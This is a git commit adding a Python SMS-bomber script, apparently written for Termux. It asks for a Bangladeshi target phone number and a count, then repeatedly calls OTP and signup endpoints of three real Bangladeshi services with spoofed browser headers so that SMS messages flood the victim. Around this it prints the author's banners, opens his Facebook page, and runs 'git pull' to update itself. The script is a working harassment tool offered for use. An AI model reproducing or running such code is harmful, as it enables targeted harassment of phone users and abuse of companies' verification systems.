591ce2e11a00e251e04a9bfe2112a105df5b789e
AK Saed <165506282+saedhasan7840@users.noreply.github.com>
2024-04-02 23:43:07 +0600

    Create AK.Bomb.py

---
+++ AK.Bomb.py
@@ -0,0 +1,257 @@
+import os
+
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] AK SAED HASAN (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
+
+os.system("pkg install espeak")
+
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
+
+os.system('espeak -a 300 "Robot install complete"')
+
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS AK SAED HASAN\033[1;30m")
+
+os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH CHOR KISHOREGANJ BLACK HAT HACKER SAED HASAN "')
+
+os.system("git pull")
+
+import os,requests,time
+
+time.sleep(1)
+
+os.system("clear")
+
+os.system("xdg-open https://www.facebook.com/profile.php?id=100090616361619&mibextid=ZbWKwL/")
+
+logo3=("""
+
+       \x1b[38;5;196m╔═════════════════════════════════╗
+
+       \x1b[38;5;196m║\033[38;5;46m  /$$$$$$  /$$   /$$ \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m /$$__  $$| $$  /$$/\x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$  \ $$| $$ /$$/\x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$$$$$$$| $$$$$/       \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$__  $$| $$  $$       \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$  | $$| $$\  $$\x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$  | $$| $$ \  $$    \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m|__/  |__/|__/  \__/      \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m╚═════════════════════════════════╝
+
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m💞AK Saed\x1b[38;5;196m╔══════════════════╗
+
+\x1b[38;5;196m║\033[38;5;46m[😍]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋AK SAED👨‍💻\x1b[38;5;196m║\033[38;5;46mSAED             \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[A]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋AK SAED👨‍💻\x1b[38;5;196m║\033[38;5;46mSAED HASAN      \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[K]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋AK SAED👨‍💻\x1b[38;5;196m║\033[38;5;46m01690241739    \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[S]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋AK SAED👨‍💻\x1b[38;5;196m║\033[38;5;46mAK SAED \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[A]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋AK SAED👨‍💻\x1b[38;5;196m║\033[38;5;46m01690241739     \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[E]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46m🦋AK SAED👨‍💻\x1b[38;5;196m║\033[38;5;46m01690241739     \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[D]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋AK SAED👨‍💻\x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
+
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m💞AK Saed\x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
+
+os.system('espeak -a 300 "author saed hasan "')
+
+os.system('espeak -a 300 "Facebook  Saed hasan "')
+
+os.system('espeak -a 300 "whathapp 01690241739 "')
+
+os.system('espeak -a 300 "github AK Saed "')
+
+os.system('espeak -a 300 "telegram 01690241739 "')
+
+os.system('espeak -a 300 "imo 01690241739 "')
+
+os.system('espeak -a 300 "from Bangladesh "')
+
+print(logo3)
+
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+
+headers1={
+
+			  "authority":"www.bioscopelive.com",
+
+			  "method":"GET",
+
+			  "scheme":"https",
+
+			  "accept":"*/*",
+
+			  "accept-encoding":"gzip, deflate, br",
+
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+
+			  "save-data":"on",
+
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+
+			  "sec-ch-ua-mobile":"?1",
+
+			  "sec-ch-ua-platform":'Android',
+
+			  "sec-fetch-dest":"empty",
+
+			  "sec-fetch-mode":"cors",
+
+			  "sec-fetch-site":"same-origin",
+
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+
+			  "x-requested-with":"XMLHttpRequest"
+
+}
+
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+
+headers2={
+
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+
+}
+
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+
+data={
+
+  "name": num,
+
+  "phoneNumber": num,
+
+  "service": "redx"
+
+}
+
+headers3={
+
+  "referer":"https://redx.com.bd/",
+
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+
+}
+
+ses=0
+
+while amount>ses:
+
+  sent1=requests.get(url1,headers=headers1)
+
+  if sent1.status_code==200:
+
+    ses+=1
+
+    print(f"\n{ses}  \033[38;5;46m🦋AK🍁SAED SMS WAS SENT🐼")
+
+  else:
+
+    pass
+
+  
+
+  sent2=requests.get(url2,headers=headers2)
+
+  if sent2.status_code==200:
+
+    ses+=1
+
+    print(f"\n{ses} \033[38;5;46m🦋AK🍁SAED SMS WAS SENT🐼")
+
+  else:
+
+    pass
+
+  
+
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+
+  if send3.status_code==200:
+
+    ses+=1
+
+    print(f"\n{ses} \033[38;5;46m🦋AK🍁SAED  SMS WAS SENT🐼")
+
+    
+
+  else:
+
+    pass
+
+os.system("clear")
+
+print(""" \033[1;32m
+
+\x1b[38;5;196m SEN🐼        
+
+       \x1b[38;5;196m╔═════════════════════════════════╗
+
+       \x1b[38;5;196m║\033[38;5;46m  /$$$$$$  /$$   /$$   \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m /$$__  $$| $$  /$$/ \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$  \ $$| $$ /$$/ \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$$$$$$$| $$$$$/        \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$__  $$| $$  $$        \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$  | $$| $$\  $$ \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m| $$  | $$| $$ \  $$ \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m║\033[38;5;46m|__/  |__/|__/  \__/  \x1b[38;5;196m║\x1b[38;5;196m
+
+       \x1b[38;5;196m╚═════════════════════════════════╝
+
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋SAED🍁HASAN \x1b[38;5;196m╔══════════════════╗
+
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋SAED🍁HASAN \x1b[38;5;196m║\033[38;5;46mSAED🍁HASAN           \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[S]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋SAED🍁HASAN  \x1b[38;5;196m║\033[38;5;46mSAED🍁HASAN      \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[A]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋SAED🍁HASAN \x1b[38;5;196m║\033[38;5;46m01690241739     \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[E]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋SAED🍁HASAN \x1b[38;5;196m║\033[38;5;46mAK SAED \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[D]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋SAED🍁HASAN \x1b[38;5;196m║\033[38;5;46m01690241739     \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[🥰]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46m🦋SAED🍁HASAN  \x1b[38;5;196m║\033[38;5;46m01690241739     \x1b[38;5;196m║
+
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋SAED🍁HASAN \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        \x1b[38;5;196m║
+
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋SAED🍁HASAN \x1b[38;5;196m╚══════════════════╝
+
+      \033[38;5;46m____  ____  _____ ____ 
+
+     \033[38;5;46m/ ___\/  _ \/  __//  _ \
+
+    \033[38;5;46m|    \| / \||  \  | | \|  
+
+   \033[38;5;46m\___ || |-|||  /_ | |_/|  
+
+  \033[38;5;46m\____/\_/ \|\____\\____/  
+
+                            
+
+ TNQ FOR USING OUR TOOLS 🖤
+
+""")
